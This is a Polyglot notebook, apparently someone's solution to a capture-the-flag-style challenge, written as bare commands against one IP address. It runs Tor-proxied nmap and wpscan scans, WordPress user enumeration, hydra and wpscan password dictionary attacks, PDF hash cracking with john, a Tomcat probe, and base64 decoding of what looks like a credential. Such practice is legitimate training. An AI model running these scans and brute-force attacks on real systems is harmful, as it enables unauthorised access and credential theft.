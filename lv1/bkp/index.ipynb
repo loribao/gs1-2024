{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    }
   },
   "outputs": [],
   "source": [
    "proxychains nmap 138.197.91.116"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    }
   },
   "outputs": [],
   "source": [
    "proxychains4 nmap 138.197.91.116 -sT -PN -sV -open"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    }
   },
   "outputs": [],
   "source": [
    "proxychains nmap -sV --script vulners 138.197.91.116"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    }
   },
   "outputs": [],
   "source": [
    "wpscan --url http://138.197.91.116 --max-threads 10 -e --proxy socks5://127.0.0.1:9050"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Enumeração de usuarios"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    }
   },
   "outputs": [],
   "source": [
    "curl -x socks5://127.0.0.1:9050 \"http://138.197.91.116/index.php/wp-json/wp/v2/users/?per_page=100&page=1\" 2> /dev/null"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "fsharp"
    },
    "polyglot_notebook": {
     "kernelName": "fsharp"
    }
   },
   "outputs": [],
   "source": [
    "#r \"nuget: FSharp.Data, 6.4.0\"\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "fsharp"
    },
    "polyglot_notebook": {
     "kernelName": "fsharp"
    }
   },
   "outputs": [],
   "source": [
    "open FSharp.Data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "fsharp"
    },
    "polyglot_notebook": {
     "kernelName": "fsharp"
    }
   },
   "outputs": [],
   "source": [
    "let data = \"\"\"[{\"id\":2,\"name\":\"bartell.maribel\",\"url\":\"\",\"description\":\"Nesciunt dignissimos nemo nulla doloribus omnis. Quia esse reiciendis eum perspiciatis quod et. Adipisci sapiente atque quidem officiis explicabo cupiditate.\",\"link\":\"http:\\/\\/138.197.91.116\\/index.php\\/author\\/bartell-maribel\\/\",\"slug\":\"bartell-maribel\",\"avatar_urls\":{\"24\":\"https:\\/\\/secure.gravatar.com\\/avatar\\/b34f9f64d1263b9558f11be31851b157?s=24&d=mm&r=g\",\"48\":\"https:\\/\\/secure.gravatar.com\\/avatar\\/b34f9f64d1263b9558f11be31851b157?s=48&d=mm&r=g\",\"96\":\"https:\\/\\/secure.gravatar.com\\/avatar\\/b34f9f64d1263b9558f11be31851b157?s=96&d=mm&r=g\"},\"meta\":[],\"_links\":{\"self\":[{\"href\":\"http:\\/\\/138.197.91.116\\/index.php\\/wp-json\\/wp\\/v2\\/users\\/2\",\"targetHints\":{\"allow\":[\"GET\"]}}],\"collection\":[{\"href\":\"http:\\/\\/138.197.91.116\\/index.php\\/wp-json\\/wp\\/v2\\/users\"}]}},{\"id\":10,\"name\":\"hobart.gerhold\",\"url\":\"\",\"description\":\"Fuga hic aliquid est aut vel cupiditate praesentium. Sed ducimus quia rerum omnis facilis. Et nostrum laborum ad.\",\"link\":\"http:\\/\\/138.197.91.116\\/index.php\\/author\\/hobart-gerhold\\/\",\"slug\":\"hobart-gerhold\",\"avatar_urls\":{\"24\":\"https:\\/\\/secure.gravatar.com\\/avatar\\/617229330275bd436cd38a8f5e94efa1?s=24&d=mm&r=g\",\"48\":\"https:\\/\\/secure.gravatar.com\\/avatar\\/617229330275bd436cd38a8f5e94efa1?s=48&d=mm&r=g\",\"96\":\"https:\\/\\/secure.gravatar.com\\/avatar\\/617229330275bd436cd38a8f5e94efa1?s=96&d=mm&r=g\"},\"meta\":[],\"_links\":{\"self\":[{\"href\":\"http:\\/\\/138.197.91.116\\/index.php\\/wp-json\\/wp\\/v2\\/users\\/10\",\"targetHints\":{\"allow\":[\"GET\"]}}],\"collection\":[{\"href\":\"http:\\/\\/138.197.91.116\\/index.php\\/wp-json\\/wp\\/v2\\/users\"}]}},{\"id\":9,\"name\":\"laisha.pouros\",\"url\":\"\",\"description\":\"Ducimus sit cum explicabo placeat non totam quidem. Nemo doloribus corporis dolorum aut asperiores magni sint. Aut molestiae voluptatem et vitae recusandae iure error.\",\"link\":\"http:\\/\\/138.197.91.116\\/index.php\\/author\\/laisha-pouros\\/\",\"slug\":\"laisha-pouros\",\"avatar_urls\":{\"24\":\"https:\\/\\/secure.gravatar.com\\/avatar\\/c455116346b295b104526f5852ad1a3c?s=24&d=mm&r=g\",\"48\":\"https:\\/\\/secure.gravatar.com\\/avatar\\/c455116346b295b104526f5852ad1a3c?s=48&d=mm&r=g\",\"96\":\"https:\\/\\/secure.gravatar.com\\/avatar\\/c455116346b295b104526f5852ad1a3c?s=96&d=mm&r=g\"},\"meta\":[],\"_links\":{\"self\":[{\"href\":\"http:\\/\\/138.197.91.116\\/index.php\\/wp-json\\/wp\\/v2\\/users\\/9\",\"targetHints\":{\"allow\":[\"GET\"]}}],\"collection\":[{\"href\":\"http:\\/\\/138.197.91.116\\/index.php\\/wp-json\\/wp\\/v2\\/users\"}]}},{\"id\":8,\"name\":\"lola.oreilly\",\"url\":\"\",\"description\":\"Aut consequatur quibusdam quidem omnis et. Eligendi vero beatae animi. Quis quia ratione ad facere at. Quam similique ipsum eius repellendus ullam.\",\"link\":\"http:\\/\\/138.197.91.116\\/index.php\\/author\\/lola-oreilly\\/\",\"slug\":\"lola-oreilly\",\"avatar_urls\":{\"24\":\"https:\\/\\/secure.gravatar.com\\/avatar\\/87ddcb607d042104afd95c4ef9603e27?s=24&d=mm&r=g\",\"48\":\"https:\\/\\/secure.gravatar.com\\/avatar\\/87ddcb607d042104afd95c4ef9603e27?s=48&d=mm&r=g\",\"96\":\"https:\\/\\/secure.gravatar.com\\/avatar\\/87ddcb607d042104afd95c4ef9603e27?s=96&d=mm&r=g\"},\"meta\":[],\"_links\":{\"self\":[{\"href\":\"http:\\/\\/138.197.91.116\\/index.php\\/wp-json\\/wp\\/v2\\/users\\/8\",\"targetHints\":{\"allow\":[\"GET\"]}}],\"collection\":[{\"href\":\"http:\\/\\/138.197.91.116\\/index.php\\/wp-json\\/wp\\/v2\\/users\"}]}},{\"id\":5,\"name\":\"mayert.noemy\",\"url\":\"\",\"description\":\"Magnam repellendus repellat eius illum rerum architecto. Dicta et adipisci vitae. Quia similique in doloribus.\",\"link\":\"http:\\/\\/138.197.91.116\\/index.php\\/author\\/mayert-noemy\\/\",\"slug\":\"mayert-noemy\",\"avatar_urls\":{\"24\":\"https:\\/\\/secure.gravatar.com\\/avatar\\/b2875cce6309a64b6d243f9d0af75ad1?s=24&d=mm&r=g\",\"48\":\"https:\\/\\/secure.gravatar.com\\/avatar\\/b2875cce6309a64b6d243f9d0af75ad1?s=48&d=mm&r=g\",\"96\":\"https:\\/\\/secure.gravatar.com\\/avatar\\/b2875cce6309a64b6d243f9d0af75ad1?s=96&d=mm&r=g\"},\"meta\":[],\"_links\":{\"self\":[{\"href\":\"http:\\/\\/138.197.91.116\\/index.php\\/wp-json\\/wp\\/v2\\/users\\/5\",\"targetHints\":{\"allow\":[\"GET\"]}}],\"collection\":[{\"href\":\"http:\\/\\/138.197.91.116\\/index.php\\/wp-json\\/wp\\/v2\\/users\"}]}},{\"id\":1,\"name\":\"neo\",\"url\":\"http:\\/\\/138.197.91.116\",\"description\":\"\",\"link\":\"http:\\/\\/138.197.91.116\\/index.php\\/author\\/neo\\/\",\"slug\":\"neo\",\"avatar_urls\":{\"24\":\"https:\\/\\/secure.gravatar.com\\/avatar\\/83034b5d292b617116b1f2896958403d?s=24&d=mm&r=g\",\"48\":\"https:\\/\\/secure.gravatar.com\\/avatar\\/83034b5d292b617116b1f2896958403d?s=48&d=mm&r=g\",\"96\":\"https:\\/\\/secure.gravatar.com\\/avatar\\/83034b5d292b617116b1f2896958403d?s=96&d=mm&r=g\"},\"meta\":[],\"_links\":{\"self\":[{\"href\":\"http:\\/\\/138.197.91.116\\/index.php\\/wp-json\\/wp\\/v2\\/users\\/1\",\"targetHints\":{\"allow\":[\"GET\"]}}],\"collection\":[{\"href\":\"http:\\/\\/138.197.91.116\\/index.php\\/wp-json\\/wp\\/v2\\/users\"}]}}]\"\"\"\n",
    "type User = JsonProvider<\"\"\"[{\"id\":2,\"name\":\"bartell.maribel\",\"url\":\"\",\"description\":\"Nesciunt dignissimos nemo nulla doloribus omnis. Quia esse reiciendis eum perspiciatis quod et. Adipisci sapiente atque quidem officiis explicabo cupiditate.\",\"link\":\"http:\\/\\/138.197.91.116\\/index.php\\/author\\/bartell-maribel\\/\",\"slug\":\"bartell-maribel\",\"avatar_urls\":{\"24\":\"https:\\/\\/secure.gravatar.com\\/avatar\\/b34f9f64d1263b9558f11be31851b157?s=24&d=mm&r=g\",\"48\":\"https:\\/\\/secure.gravatar.com\\/avatar\\/b34f9f64d1263b9558f11be31851b157?s=48&d=mm&r=g\",\"96\":\"https:\\/\\/secure.gravatar.com\\/avatar\\/b34f9f64d1263b9558f11be31851b157?s=96&d=mm&r=g\"},\"meta\":[],\"_links\":{\"self\":[{\"href\":\"http:\\/\\/138.197.91.116\\/index.php\\/wp-json\\/wp\\/v2\\/users\\/2\",\"targetHints\":{\"allow\":[\"GET\"]}}],\"collection\":[{\"href\":\"http:\\/\\/138.197.91.116\\/index.php\\/wp-json\\/wp\\/v2\\/users\"}]}},{\"id\":10,\"name\":\"hobart.gerhold\",\"url\":\"\",\"description\":\"Fuga hic aliquid est aut vel cupiditate praesentium. Sed ducimus quia rerum omnis facilis. Et nostrum laborum ad.\",\"link\":\"http:\\/\\/138.197.91.116\\/index.php\\/author\\/hobart-gerhold\\/\",\"slug\":\"hobart-gerhold\",\"avatar_urls\":{\"24\":\"https:\\/\\/secure.gravatar.com\\/avatar\\/617229330275bd436cd38a8f5e94efa1?s=24&d=mm&r=g\",\"48\":\"https:\\/\\/secure.gravatar.com\\/avatar\\/617229330275bd436cd38a8f5e94efa1?s=48&d=mm&r=g\",\"96\":\"https:\\/\\/secure.gravatar.com\\/avatar\\/617229330275bd436cd38a8f5e94efa1?s=96&d=mm&r=g\"},\"meta\":[],\"_links\":{\"self\":[{\"href\":\"http:\\/\\/138.197.91.116\\/index.php\\/wp-json\\/wp\\/v2\\/users\\/10\",\"targetHints\":{\"allow\":[\"GET\"]}}],\"collection\":[{\"href\":\"http:\\/\\/138.197.91.116\\/index.php\\/wp-json\\/wp\\/v2\\/users\"}]}},{\"id\":9,\"name\":\"laisha.pouros\",\"url\":\"\",\"description\":\"Ducimus sit cum explicabo placeat non totam quidem. Nemo doloribus corporis dolorum aut asperiores magni sint. Aut molestiae voluptatem et vitae recusandae iure error.\",\"link\":\"http:\\/\\/138.197.91.116\\/index.php\\/author\\/laisha-pouros\\/\",\"slug\":\"laisha-pouros\",\"avatar_urls\":{\"24\":\"https:\\/\\/secure.gravatar.com\\/avatar\\/c455116346b295b104526f5852ad1a3c?s=24&d=mm&r=g\",\"48\":\"https:\\/\\/secure.gravatar.com\\/avatar\\/c455116346b295b104526f5852ad1a3c?s=48&d=mm&r=g\",\"96\":\"https:\\/\\/secure.gravatar.com\\/avatar\\/c455116346b295b104526f5852ad1a3c?s=96&d=mm&r=g\"},\"meta\":[],\"_links\":{\"self\":[{\"href\":\"http:\\/\\/138.197.91.116\\/index.php\\/wp-json\\/wp\\/v2\\/users\\/9\",\"targetHints\":{\"allow\":[\"GET\"]}}],\"collection\":[{\"href\":\"http:\\/\\/138.197.91.116\\/index.php\\/wp-json\\/wp\\/v2\\/users\"}]}},{\"id\":8,\"name\":\"lola.oreilly\",\"url\":\"\",\"description\":\"Aut consequatur quibusdam quidem omnis et. Eligendi vero beatae animi. Quis quia ratione ad facere at. Quam similique ipsum eius repellendus ullam.\",\"link\":\"http:\\/\\/138.197.91.116\\/index.php\\/author\\/lola-oreilly\\/\",\"slug\":\"lola-oreilly\",\"avatar_urls\":{\"24\":\"https:\\/\\/secure.gravatar.com\\/avatar\\/87ddcb607d042104afd95c4ef9603e27?s=24&d=mm&r=g\",\"48\":\"https:\\/\\/secure.gravatar.com\\/avatar\\/87ddcb607d042104afd95c4ef9603e27?s=48&d=mm&r=g\",\"96\":\"https:\\/\\/secure.gravatar.com\\/avatar\\/87ddcb607d042104afd95c4ef9603e27?s=96&d=mm&r=g\"},\"meta\":[],\"_links\":{\"self\":[{\"href\":\"http:\\/\\/138.197.91.116\\/index.php\\/wp-json\\/wp\\/v2\\/users\\/8\",\"targetHints\":{\"allow\":[\"GET\"]}}],\"collection\":[{\"href\":\"http:\\/\\/138.197.91.116\\/index.php\\/wp-json\\/wp\\/v2\\/users\"}]}},{\"id\":5,\"name\":\"mayert.noemy\",\"url\":\"\",\"description\":\"Magnam repellendus repellat eius illum rerum architecto. Dicta et adipisci vitae. Quia similique in doloribus.\",\"link\":\"http:\\/\\/138.197.91.116\\/index.php\\/author\\/mayert-noemy\\/\",\"slug\":\"mayert-noemy\",\"avatar_urls\":{\"24\":\"https:\\/\\/secure.gravatar.com\\/avatar\\/b2875cce6309a64b6d243f9d0af75ad1?s=24&d=mm&r=g\",\"48\":\"https:\\/\\/secure.gravatar.com\\/avatar\\/b2875cce6309a64b6d243f9d0af75ad1?s=48&d=mm&r=g\",\"96\":\"https:\\/\\/secure.gravatar.com\\/avatar\\/b2875cce6309a64b6d243f9d0af75ad1?s=96&d=mm&r=g\"},\"meta\":[],\"_links\":{\"self\":[{\"href\":\"http:\\/\\/138.197.91.116\\/index.php\\/wp-json\\/wp\\/v2\\/users\\/5\",\"targetHints\":{\"allow\":[\"GET\"]}}],\"collection\":[{\"href\":\"http:\\/\\/138.197.91.116\\/index.php\\/wp-json\\/wp\\/v2\\/users\"}]}},{\"id\":1,\"name\":\"neo\",\"url\":\"http:\\/\\/138.197.91.116\",\"description\":\"\",\"link\":\"http:\\/\\/138.197.91.116\\/index.php\\/author\\/neo\\/\",\"slug\":\"neo\",\"avatar_urls\":{\"24\":\"https:\\/\\/secure.gravatar.com\\/avatar\\/83034b5d292b617116b1f2896958403d?s=24&d=mm&r=g\",\"48\":\"https:\\/\\/secure.gravatar.com\\/avatar\\/83034b5d292b617116b1f2896958403d?s=48&d=mm&r=g\",\"96\":\"https:\\/\\/secure.gravatar.com\\/avatar\\/83034b5d292b617116b1f2896958403d?s=96&d=mm&r=g\"},\"meta\":[],\"_links\":{\"self\":[{\"href\":\"http:\\/\\/138.197.91.116\\/index.php\\/wp-json\\/wp\\/v2\\/users\\/1\",\"targetHints\":{\"allow\":[\"GET\"]}}],\"collection\":[{\"href\":\"http:\\/\\/138.197.91.116\\/index.php\\/wp-json\\/wp\\/v2\\/users\"}]}}]\"\"\">"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "fsharp"
    },
    "polyglot_notebook": {
     "kernelName": "fsharp"
    }
   },
   "outputs": [],
   "source": [
    "let users = User.Parse(data)\n",
    "users |> Seq.iter (fun user -> printfn \"%s\" user.Name)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Ataque de dicionario WP | usuarios WP "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    }
   },
   "outputs": [],
   "source": [
    "wpscan --url http://138.197.91.116/ --login-uri \"http://138.197.91.116/wp-login.php?redirect_to=http%3A%2F%2F138.197.91.116%2Fwp-admin%2F&reauth=1\" --max-threads 10 -e --proxy socks5://127.0.0.1:9050  --usernames ./users.txt --passwords /usr/share/wordlists/rockyou.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    }
   },
   "outputs": [],
   "source": [
    "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 138.197.91.116 http-post-form \"/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location\" -V"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    }
   },
   "outputs": [],
   "source": [
    "curl -x socks5://127.0.0.1:9050 -o downloads/context.pdf  http://138.197.91.116/wp-content/uploads/2024/06/context.pdf 2> /dev/null"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "fsharp"
    },
    "polyglot_notebook": {
     "kernelName": "fsharp"
    }
   },
   "outputs": [],
   "source": [
    "\"S3poaGRsaXc6IGxVNTZtNGZkazA0NW9OZjg3ek1tckZ0MkQ=\" |> System.Convert.FromBase64String |> System.Text.Encoding.UTF8.GetString"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "fsharp"
    },
    "polyglot_notebook": {
     "kernelName": "fsharp"
    }
   },
   "outputs": [],
   "source": [
    "\"RklBUHt0MG1fYW5kX2ozcnJ5P30=\" |> System.Convert.FromBase64String |> System.Text.Encoding.UTF8.GetString"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "fsharp"
    },
    "polyglot_notebook": {
     "kernelName": "fsharp"
    }
   },
   "outputs": [],
   "source": [
    "let caesarDecrypt (text: string) (shift: int) =\n",
    "    let shiftChar c =\n",
    "        if System.Char.IsLetter(c) then\n",
    "            let a = if System.Char.IsUpper(c) then 'A' else 'a'\n",
    "            let shifted = (int c - int a - shift + 26) % 26 + int a\n",
    "            char shifted\n",
    "        else\n",
    "            c\n",
    "    new string (text |> Seq.map shiftChar |> Seq.toArray)\n",
    "\n",
    "let encryptedText = \"Kzhhdliw\"\n",
    "let shift = 6\n",
    "let decryptedText = caesarDecrypt encryptedText shift\n",
    "\n",
    "printfn \"Texto decodificado: %s\" decryptedText"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    }
   },
   "outputs": [],
   "source": [
    "pdf2john downloads/context.pdf > context.hash"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    }
   },
   "outputs": [],
   "source": [
    "john context.hash --wordlist=/usr/share/wordlists/rockyou.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    }
   },
   "outputs": [],
   "source": [
    "john context.hash --show "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Tomcat port 8888"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    }
   },
   "outputs": [],
   "source": [
    "\n",
    "curl -x socks5://127.0.0.1:9050 http://138.197.91.116:8888/examples/jsp/snp/snoop.jsp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    }
   },
   "outputs": [],
   "source": [
    "curl -x socks5://127.0.0.1:9050 http://138.197.91.116:8888/examples/jsp/snp/snoop.jsp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "fsharp"
    },
    "polyglot_notebook": {
     "kernelName": "fsharp"
    }
   },
   "outputs": [],
   "source": [
    "open System\n",
    "open System.IO\n",
    "open System.Net\n",
    "\n",
    "// Função para baixar uma imagem a partir de uma URL\n",
    "let downloadImage (url: string) (outputDir: string) =\n",
    "    try\n",
    "        let uri = Uri(url)\n",
    "        let fileName = Path.GetFileName(uri.LocalPath)\n",
    "        let outputPath = Path.Combine(outputDir, fileName)\n",
    "        use client = new WebClient()\n",
    "        client.DownloadFile(uri, outputPath)\n",
    "        printfn \"Imagem baixada: %s\" outputPath\n",
    "    with\n",
    "        | ex -> printfn \"Erro ao baixar %s: %s\" url ex.Message\n",
    "\n",
    "// Diretório para salvar as imagens\n",
    "let outputDir = \"imagens\"\n",
    "Directory.CreateDirectory(outputDir) |> ignore\n",
    "\n",
    "// Lê o arquivo e filtra as URLs que terminam com .jpg ou .png\n",
    "let urls = File.ReadAllLines(\"all_urls_detect_zap.txt\")\n",
    "let imageUrls = urls |> Array.filter (fun url -> url.EndsWith(\".jpg\") || url.EndsWith(\".png\"))\n",
    "\n",
    "// Baixa cada imagem\n",
    "imageUrls |> Array.iter (fun url -> downloadImage url outputDir)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (C#)",
   "language": "C#",
   "name": ".net-csharp"
  },
  "polyglot_notebook": {
   "kernelInfo": {
    "defaultKernelName": "csharp",
    "items": [
     {
      "aliases": [],
      "name": "csharp"
     },
     {
      "aliases": [],
      "languageName": "pwsh",
      "name": "pwsh"
     }
    ]
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
